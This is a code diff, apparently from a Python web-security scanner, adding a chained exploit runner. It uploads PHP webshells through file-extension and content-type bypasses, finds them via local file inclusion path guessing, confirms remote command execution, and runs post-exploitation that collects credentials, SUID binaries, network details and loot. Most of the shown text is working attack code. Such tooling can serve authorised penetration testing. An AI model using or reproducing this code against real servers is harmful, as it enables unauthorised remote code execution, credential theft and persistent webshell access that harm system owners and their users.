+                    f"4. Execute: <shell_url>?cmd=id",
+                ],
+                "impact": "Remote Code Execution via File Upload chain (PoC — shell path unknown)",
+            }
+
+        # --- Step 3: Verify shell execution ---
+        _logger.info(f"[ChainExploitRunner] Upload→RCE: verifying shell at {shell_url}")
+        shell_output: Optional[str] = None
+        try:
+            r = self.session.get(f"{shell_url}?cmd=id", timeout=10)
+            ws_match = re.search(
+                f"<{ws_marker}>(.*?)</{ws_marker}>", r.text, re.DOTALL
+            )
+            if ws_match:
+                shell_output = ws_match.group(1).strip()
+            else:
+                uid_match = re.search(r"uid=\d+\([^)]+\)", r.text)
+                shell_output = uid_match.group(0) if uid_match else None
+        except Exception as exc:
+            _logger.warning(f"[ChainExploitRunner] shell verify failed: {exc!r}")
+
+        if not shell_output:
+            _logger.info("[ChainExploitRunner] Upload→RCE: shell not executing")
+            return {
+                "type": "FileUpload→RCE Chain (upload confirmed, RCE unverified)",
+                "upload_endpoint": upload_url,
+                "shell_url": shell_url,
+                "impact": "Webshell uploaded but RCE execution not confirmed",
+            }
+
+        _logger.info(f"[ChainExploitRunner] Upload→RCE: RCE CONFIRMED — {shell_output!r}")
+
+        # --- Step 4: Post-exploit chain via WebShellCommandRunner ---
+        post_exploit_result: Optional[Dict[str, Any]] = None
+        try:
+            from websecure.core.post_exploit import WebShellCommandRunner, PostExploitChain
+
+            _session_ref2 = self.session
+            _shell_url_ref = shell_url
+            _ws_marker_ref = ws_marker
+
+            def _shell_inject(_url: str, _param: str, cmd: str) -> str:
+                try:
+                    resp = _session_ref2.get(f"{_shell_url_ref}?cmd={cmd}", timeout=12)
+                    ws_m = re.search(
+                        f"<{_ws_marker_ref}>(.*?)</{_ws_marker_ref}>", resp.text, re.DOTALL
+                    )
+                    return ws_m.group(1).strip() if ws_m else resp.text[:500]
+                except Exception:
+                    return ""
+
+            runner = WebShellCommandRunner(
+                inject_fn=_shell_inject,
+                url=shell_url,
+                param="cmd",
+            )
+            chain = PostExploitChain()
+            pe_result = chain.run(runner, url=upload_url, method="webshell_upload_rce")
+            post_exploit_result = {
+                "user": pe_result.user,
+                "os_info": pe_result.os_info,
+                "hostname": pe_result.hostname,
+                "network_info": pe_result.network_info,
+                "suid_binaries": pe_result.suid_binaries[:10],
+                "credentials_found": pe_result.credentials,
+                "loot_keys": list(pe_result.loot.keys()),
+                "web_shells_dropped": pe_result.web_shells_dropped,
+            }
+            _logger.info(
+                f"[ChainExploitRunner] Post-exploit complete: user={pe_result.user!r}"
+            )
+        except Exception as exc:
+            _logger.warning(f"[ChainExploitRunner] post-exploit chain failed: {exc!r}")
 
         return {
-            "type": "FileUpload→LFI→RCE Chain",
-            "upload_endpoint": upload_node.url,
-            "lfi_endpoint": lfi_node.url,
-            "poc": (
-                f"1. Upload PHP shell to {upload_node.url} "
-                f"(bypass via .php.jpg or null byte)\n"
-                f"2. Determine upload path (check response/source code)\n"
-                f"3. Trigger via LFI: {lfi_node.url}?{lfi_param}=../uploads/shell.php\n"
-                f"4. Execute: ?{lfi_param}=../uploads/shell.php&ws_cmd=id"
+            "type": "FileUpload→RCE Chain",
+            "upload_endpoint": upload_url,
+            "shell_url": shell_url,
+            "rce_output": shell_output,
+            "post_exploit": post_exploit_result,
+            "impact": (
+                f"Remote Code Execution via File Upload — {shell_output}"
+                + (" + full post-exploit recon" if post_exploit_result else "")
             ),
-            "impact": "Remote Code Execution via Upload+LFI chain",
+            "evidence": {
+                "upload_url": upload_url,
+                "shell_url": shell_url,
+                "rce_proof": shell_output,
+            },
         }
+
+    def _attempt_webshell_upload(
+        self, upload_url: str, webshell_content: str
+    ) -> Optional[str]:
+        """
+        Attempt to upload a PHP webshell using several bypass techniques.
+
+        Tries:
+        1. Direct .php upload
+        2. Double extension: .php.jpg
+        3. Uppercase: .PHP
+        4. Content-type bypass: image/jpeg with .php name
+
+        Returns the shell URL if discovered from the response, else None.
+        """
+        filename_variants = [
+            ("ws_shell.php",     "application/x-php"),
+            ("ws_shell.php.jpg", "image/jpeg"),
+            ("ws_shell.pHp",     "application/octet-stream"),
+            ("ws_shell.php5",    "application/x-php"),
+            ("ws_shell.phtml",   "text/html"),
+        ]
+        for fname, ctype in filename_variants:
+            try:
+                files = {"file": (fname, webshell_content.encode(), ctype)}
+                r = self.session.post(upload_url, files=files, timeout=12)
+                if r.status_code in (200, 201, 302):
+                    # Try to extract the URL from response
+                    shell_url = self._extract_shell_url_from_response(r, fname, upload_url)
+                    if shell_url:
+                        _logger.info(
+                            f"[ChainExploitRunner] Webshell uploaded: {shell_url} "
+                            f"(filename={fname})"
+                        )
+                        return shell_url
+            except Exception as exc:
+                _logger.debug(f"[ChainExploitRunner] upload attempt ({fname}) failed: {exc!r}")
+                continue
+        return None
+
+    @staticmethod
+    def _extract_shell_url_from_response(
+        response: Any, filename: str, upload_url: str
+    ) -> Optional[str]:
+        """
+        Extract the uploaded file URL from a successful upload response.
+
+        Checks:
+        1. Location header (redirect to file)
+        2. JSON response with url/path/location key
+        3. HTML src/href attribute pointing to the filename
+        """
+        import json as _json
+        from urllib.parse import urlparse, urljoin
+
+        # Check Location header
+        location = response.headers.get("Location", "")
+        if location and filename.split(".")[0] in location:
+            return urljoin(upload_url, location)
+
+        # Check JSON response
+        try:
+            data = _json.loads(response.text)
+            for key in ("url", "path", "location", "file_url", "src", "href", "filename"):
+                val = data.get(key, "")
+                if val and (filename.split(".")[0] in val or ".php" in val):
+                    return urljoin(upload_url, val)
+        except Exception:
+            pass
+
+        # Check HTML for file references
+        base_name = filename.split(".")[0]
+        url_pattern = re.search(
+            rf'(?:src|href|action)=["\']([^"\']*{re.escape(base_name)}[^"\']*)["\']',
+            response.text,
+        )
+        if url_pattern:
+            return urljoin(upload_url, url_pattern.group(1))
+
+        return None
+
+    def _discover_shell_via_lfi(
+        self,
+        lfi_url: str,
+        lfi_param: str,
+        upload_url: str,
+        webshell_content: str,
+    ) -> Optional[str]:
+        """
+        Attempt to locate the uploaded webshell path via LFI path guessing.
+
+        Builds candidate paths from common upload directories and tries
+        LFI inclusion to detect if the shell is present and PHP-executed.
+        """
+        from urllib.parse import urlparse, urljoin
+        upload_path = urlparse(upload_url).path
+
+        # Common upload directory guesses
+        base_dirs = [
+            "/uploads/", "/upload/", "/files/", "/media/", "/images/",
+            "/static/uploads/", "/wp-content/uploads/", "/assets/uploads/",
+            f"{upload_path}/../",
+        ]
+        shell_names = ["ws_shell.php", "ws_shell.pHp", "ws_shell.php.jpg"]
+
+        for base_dir in base_dirs:
+            for shell_name in shell_names:
+                candidate_path = f"..{base_dir}{shell_name}"
+                try:
+                    inject_url = self._build_inject_url(lfi_url, lfi_param, candidate_path)
+                    r = self.session.get(f"{inject_url}&cmd=id", timeout=8)
+                    if re.search(r"uid=\d+", r.text) or "WS_EXEC" in r.text:
+                        # Shell executed via LFI — construct direct URL
+                        parsed = urlparse(lfi_url)
+                        direct = f"{parsed.scheme}://{parsed.netloc}{base_dir}{shell_name}"
+                        _logger.info(
+                            f"[ChainExploitRunner] Shell discovered via LFI: {direct}"
+                        )
+                        return direct
+                except Exception:
+                    continue
+        return None
 
     # -------------------------------------------------------------------------
     # Helpers
@@ -2032,3 +2815,45 @@ def phase_chain_reactor(ctx: Dict[str, Any]) -> None:
     _logger.info(
         f"[ChainReactor] {len(exploit_results)} chains successfully exploited"
     )
+
+
+# -----------------------------------------------------------------------------
+# Public API
+# -----------------------------------------------------------------------------
+
+__all__ = [
+    # Data models
+    "ChainNode",
+    "ChainEdge",
+    "ChainPath",
+    "ChainFinding",
+    # Graph
+    "ExploitGraph",
+    # Calculators
+    "CVSSChainCalculator",
+    # Rules (abstract + concrete)
+    "ChainRule",
+    "XSSCSRFATOChain",
+    "InfoDisclosureIDORChain",
+    "SSRFCloudCompromiseChain",
+    "OpenRedirectXSSPhishingChain",
+    "UploadLFIRCEChain",
+    "LFILogPoisoningRCEChain",
+    "XSSCSRFPrivEscChain",
+    "SSRFLateralMovementChain",
+    "SQLiCredDumpATOChain",
+    "SQLiAdminFileWriteRCEChain",
+    "PlaybookChainRule",
+    # Loaders & builders
+    "PlaybookLoader",
+    "ExploitGraphBuilder",
+    # Detectors & reactors
+    "MultiHopDetector",
+    "ChainReactor",
+    # Exploitation
+    "ChainExploitRunner",
+    # Phase entry point
+    "phase_chain_reactor",
+    # Backward compat
+    "analyze_chains",
+]
